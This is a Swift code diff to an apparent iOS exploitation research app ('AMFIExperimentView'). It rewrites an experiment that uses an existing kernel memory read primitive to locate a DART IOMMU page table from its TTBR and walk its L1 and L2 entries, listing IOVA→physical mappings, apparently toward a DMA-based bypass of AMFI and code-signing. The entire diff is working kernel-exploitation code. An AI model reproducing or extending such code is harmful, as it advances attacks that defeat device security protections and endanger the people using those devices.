@@ -4807,177 +4807,129 @@ struct AMFIExperimentView: View {
         detail += "Found \(dartTTBRCandidates.count) TTBR candidates in __DATA\n\n"
         
         // ============================================================
-        // STEP 4: Scan GEN1/GEN2 zone for DART L1 page table pattern
-        // CRITICAL: Use RUNTIME zone boundaries derived from our proc address
-        // Zone addresses change every boot! Never hardcode them.
-        //
-        // Safe scan strategy:
-        // - Our proc is in GEN1/GEN2 zone (confirmed by previous experiments)
-        // - Scan from our proc address ± small range
-        // - Only read addresses confirmed to be in valid zone range
+        // STEP 4: Read DART L1 table directly from TTBR
+        // We found TTBR in __DATA — convert PPN to physmap VA and read L1 entries
         // ============================================================
-        detail += "=== Step 4: Scan for DART page table in zone memory ===\n"
+        detail += "=== Step 4: Read DART L1 from TTBR ===\n"
         
-        // Derive safe scan range from our proc address
-        // proc is in GEN1 or GEN2 zone — use it as anchor
         let ourProc = ds_get_our_proc()
-        detail += "Our proc: 0x\(String(format: "%llx", ourProc))\n"
         
-        // Safe zone range: scan ±2MB around our proc (stays in same zone)
-        // Align to 4KB page boundary
-        let scanCenter = ourProc & ~UInt64(0xFFF)  // page-align
-        let scanRangeSize: UInt64 = 0x200000  // 2MB
-        let scanStart = scanCenter &- scanRangeSize
-        let scanEnd = scanCenter &+ scanRangeSize
-        
-        // Additional safety: only read addresses in the general zone range
-        // Zone map is always 0xffffffdX... to 0xffffffe4...
+        // Safety bounds for all reads
         let safeZoneMin: UInt64 = 0xffffffdc00000000
         let safeZoneMax: UInt64 = 0xffffffe400000000
         
-        func isSafeToRead(_ addr: UInt64) -> Bool {
-            return addr >= safeZoneMin && addr < safeZoneMax && addr >= scanStart && addr < scanEnd
-        }
+        var confirmedDARTL1: UInt64 = 0
+        var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
+        var dartL1VA: UInt64 = 0
         
-        detail += "Scan range: 0x\(String(format: "%llx", scanStart)) - 0x\(String(format: "%llx", scanEnd))\n"
-        detail += "Safe zone bounds: 0x\(String(format: "%llx", safeZoneMin)) - 0x\(String(format: "%llx", safeZoneMax))\n\n"
-        
-        var dartL1Candidates: [(addr: UInt64, validCount: Int, firstPA: UInt64)] = []
-        
-        // Scan pages in our zone neighborhood
-        let pageSize: UInt64 = 0x1000
-        let scanPages = 512  // 2MB / 4KB = 512 pages
-        
-        for pageIdx in 0..<scanPages {
-            let pageAddr = scanStart + UInt64(pageIdx) * pageSize
+        if let firstTTBR = dartTTBRCandidates.first {
+            // TTBR value: bit[31]=VALID, bits[30:0]=PPN
+            let ppn = UInt64(firstTTBR.value) & 0x7FFFFFFF
+            let l1PA = ppn << 12  // Physical address of L1 table
             
-            // Double-check safety
-            guard pageAddr >= safeZoneMin && pageAddr < safeZoneMax else { continue }
+            // Convert to physmap VA: PA - gPhysBase + gVirtBase
+            dartL1VA = l1PA &- gPhysBase &+ gVirtBase
             
-            // Read first 8 entries of this page
-            var validCount = 0
-            var zeroCount = 0
-            var firstValidPA: UInt64 = 0
+            detail += "TTBR value: 0x\(String(format: "%08x", firstTTBR.value))\n"
+            detail += "L1 table PA: 0x\(String(format: "%llx", l1PA))\n"
+            detail += "L1 table VA (physmap): 0x\(String(format: "%llx", dartL1VA))\n\n"
             
-            for entryIdx in 0..<8 {
-                let readAddr = pageAddr + UInt64(entryIdx * 8)
+            // Verify L1 VA is in safe zone range
+            guard dartL1VA >= safeZoneMin && dartL1VA < safeZoneMax else {
+                detail += "⚠️ L1 VA outside safe zone range — cannot read directly\n"
+                detail += "L1 is in physmap/VM zone area, need different approach\n"
+                
+                let success = false
+                return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
+            }
+            
+            // Read L1 table entries (DART on A12 has 4 TTBRs × 512 entries per L1)
+            // But each TTBR points to one L1 table with 512 entries
+            detail += "Reading L1 entries:\n"
+            var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
+            
+            for i in 0..<512 {
+                let readAddr = dartL1VA + UInt64(i * 8)
                 guard readAddr >= safeZoneMin && readAddr < safeZoneMax else { continue }
                 
                 let entry = ds_kread64_safe(readAddr)
-                if entry == 0 {
-                    zeroCount += 1
-                } else if entry & 1 == 1 {
-                    // Valid DART PTE: bits[35:12] = output PA
-                    let dartPA = entry & 0x0000000FFFFFF000
-                    if dartPA >= gPhysBase && dartPA < (gPhysBase + 0x100000000) {
-                        validCount += 1
-                        if firstValidPA == 0 { firstValidPA = dartPA }
-                    }
-                }
-            }
-            
-            // DART L1 pattern: 1-4 valid entries, rest zeros
-            if validCount >= 1 && validCount <= 6 && zeroCount >= 4 {
-                dartL1Candidates.append((addr: pageAddr, validCount: validCount, firstPA: firstValidPA))
-                if dartL1Candidates.count <= 3 {
-                    detail += "  L1 candidate at 0x\(String(format: "%llx", pageAddr)): "
-                    detail += "\(validCount) valid entries, first PA=0x\(String(format: "%llx", firstValidPA))\n"
-                    
-                    // Dump first 8 entries for analysis
-                    for i in 0..<8 {
-                        let rAddr = pageAddr + UInt64(i * 8)
-                        guard rAddr >= safeZoneMin && rAddr < safeZoneMax else { continue }
-                        let e = ds_kread64_safe(rAddr)
-                        if e != 0 {
-                            detail += "    [\(i)] 0x\(String(format: "%016llx", e))\n"
-                        }
-                    }
-                }
-            }
-        }
-        
-        detail += "\nFound \(dartL1Candidates.count) potential DART L1 tables\n\n"
-        
-        // ============================================================
-        // STEP 5: If we found L1 candidates, read their L2 tables
-        // Verify the chain: L1 entry → L2 table → leaf PTEs with real PAs
-        // ============================================================
-        detail += "=== Step 5: Verify DART page table chain ===\n"
-        
-        var confirmedDARTL1: UInt64 = 0
-        var confirmedL2Entries: [(iova: UInt64, pa: UInt64)] = []
-        
-        for candidate in dartL1Candidates.prefix(3) {
-            detail += "\nChecking L1 at 0x\(String(format: "%llx", candidate.addr)):\n"
-            
-            // Read all 512 entries (or first 64 for speed)
-            var l1ValidEntries: [(idx: Int, entry: UInt64)] = []
-            
-            for i in 0..<64 {
-                let rAddr = candidate.addr + UInt64(i * 8)
-                guard rAddr >= safeZoneMin && rAddr < safeZoneMax else { continue }
-                let entry = ds_kread64_safe(rAddr)
+                if entry == 0 { continue }
+                
                 if entry & 1 == 1 {
+                    // Valid L1 entry — points to L2 table
+                    let l2PA = entry & 0x0000000FFFFFF000
                     l1ValidEntries.append((idx: i, entry: entry))
-                }
-            }
-            
-            detail += "  Valid L1 entries (first 64): \(l1ValidEntries.count)\n"
-            
-            for (idx, entry) in l1ValidEntries.prefix(2) {
-                // L1 entry points to L2 table
-                // DART PTE format: bits[35:12] = PA page number
-                let l2PA = entry & 0x0000000FFFFFF000
-                let l2VA = l2PA &- gPhysBase &+ gVirtBase
-                
-                detail += "  L1[\(idx)]: entry=0x\(String(format: "%016llx", entry))\n"
-                detail += "    L2 PA=0x\(String(format: "%llx", l2PA)), VA=0x\(String(format: "%llx", l2VA))\n"
-                
-                // Safety check: L2 VA must be in safe zone range
-                guard l2VA >= safeZoneMin && l2VA < safeZoneMax else {
-                    detail += "    ⚠️ L2 VA outside safe zone — skipping\n"
-                    continue
-                }
-                
-                // Read L2 table entries (limit to first 128 for safety)
-                var l2ValidCount = 0
-                var l2SampleEntries: [(idx: Int, pa: UInt64)] = []
-                
-                for j in 0..<128 {
-                    let l2Addr = l2VA + UInt64(j * 8)
-                    guard l2Addr >= safeZoneMin && l2Addr < safeZoneMax else { continue }
-                    let l2e = ds_kread64_safe(l2Addr)
-                    if l2e & 1 == 1 {
-                        l2ValidCount += 1
-                        let leafPA = l2e & 0x0000000FFFFFF000
-                        if l2SampleEntries.count < 4 {
-                            l2SampleEntries.append((idx: j, pa: leafPA))
-                        }
-                        
-                        let iova = UInt64(idx) << 21 | UInt64(j) << 12
-                        confirmedL2Entries.append((iova: iova, pa: leafPA))
+                    
+                    if l1ValidEntries.count <= 8 {
+                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) → L2 PA=0x\(String(format: "%llx", l2PA))\n"
+                    }
+                } else {
+                    // Non-zero but not valid — might be interesting
+                    if l1ValidEntries.count < 3 {
+                        detail += "  L1[\(i)]: 0x\(String(format: "%016llx", entry)) (not valid)\n"
                     }
                 }
+            }
+            
+            detail += "\nTotal valid L1 entries: \(l1ValidEntries.count)\n\n"
+            
+            if l1ValidEntries.count > 0 {
+                confirmedDARTL1 = dartL1VA
                 
-                detail += "    L2 valid entries: \(l2ValidCount)\n"
-                for sample in l2SampleEntries {
-                    let iova = UInt64(idx) << 21 | UInt64(sample.idx) << 12
-                    detail += "    L2[\(sample.idx)]: PA=0x\(String(format: "%llx", sample.pa)) → IOVA=0x\(String(format: "%x", iova))\n"
-                }
+                // ============================================================
+                // STEP 5: Walk L2 tables to catalog IOVA→PA mappings
+                // ============================================================
+                detail += "=== Step 5: Walk L2 tables ===\n"
                 
-                if l2ValidCount > 0 && confirmedDARTL1 == 0 {
-                    confirmedDARTL1 = candidate.addr
+                for (idx, entry) in l1ValidEntries.prefix(4) {
+                    let l2PA = entry & 0x0000000FFFFFF000
+                    let l2VA = l2PA &- gPhysBase &+ gVirtBase
+                    
+                    detail += "\nL1[\(idx)] → L2 VA=0x\(String(format: "%llx", l2VA)):\n"
+                    
+                    // Safety check
+                    guard l2VA >= safeZoneMin && l2VA < safeZoneMax else {
+                        detail += "  ⚠️ L2 VA outside safe zone — skipping\n"
+                        continue
+                    }
+                    
+                    var l2ValidCount = 0
+                    
+                    for j in 0..<512 {
+                        let l2Addr = l2VA + UInt64(j * 8)
+                        guard l2Addr >= safeZoneMin && l2Addr < safeZoneMax else { continue }
+                        
+                        let l2e = ds_kread64_safe(l2Addr)
+                        if l2e & 1 == 1 {
+                            l2ValidCount += 1
+                            let leafPA = l2e & 0x0000000FFFFFF000
+                            let iova = UInt64(idx) << 21 | UInt64(j) << 12
+                            confirmedL2Entries.append((iova: iova, pa: leafPA))
+                            
+                            // Show first few
+                            if l2ValidCount <= 3 {
+                                detail += "  L2[\(j)]: PA=0x\(String(format: "%llx", leafPA)) IOVA=0x\(String(format: "%08x", iova))\n"
+                            }
+                        }
+                    }
+                    
+                    detail += "  Valid L2 entries: \(l2ValidCount)\n"
                 }
             }
+        } else {
+            detail += "No TTBR candidates found — cannot proceed\n"
         }
+        
+        detail += "\nTotal IOVA→PA mappings: \(confirmedL2Entries.count)\n\n"
         
         // ============================================================
         // STEP 6: Summary and DAPF analysis
         // ============================================================
         detail += "\n=== Step 6: Analysis ===\n"
         
-        if confirmedDARTL1 != 0 {
-            detail += "✅ DART L1 page table confirmed at: 0x\(String(format: "%llx", confirmedDARTL1))\n"
+        if confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty {
+            let l1Addr = confirmedDARTL1 != 0 ? confirmedDARTL1 : dartL1VA
+            detail += "✅ DART L1 page table at: 0x\(String(format: "%llx", l1Addr))\n"
             detail += "Total IOVA→PA mappings found: \(confirmedL2Entries.count)\n\n"
             
             // Analyze PA range to determine DAPF constraints
@@ -5032,7 +4984,7 @@ struct AMFIExperimentView: View {
             detail += "Or: scan IOKit object graph for IODARTMapper instances\n"
         }
         
-        let success = confirmedDARTL1 != 0
+        let success = confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty
         return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
     }
     
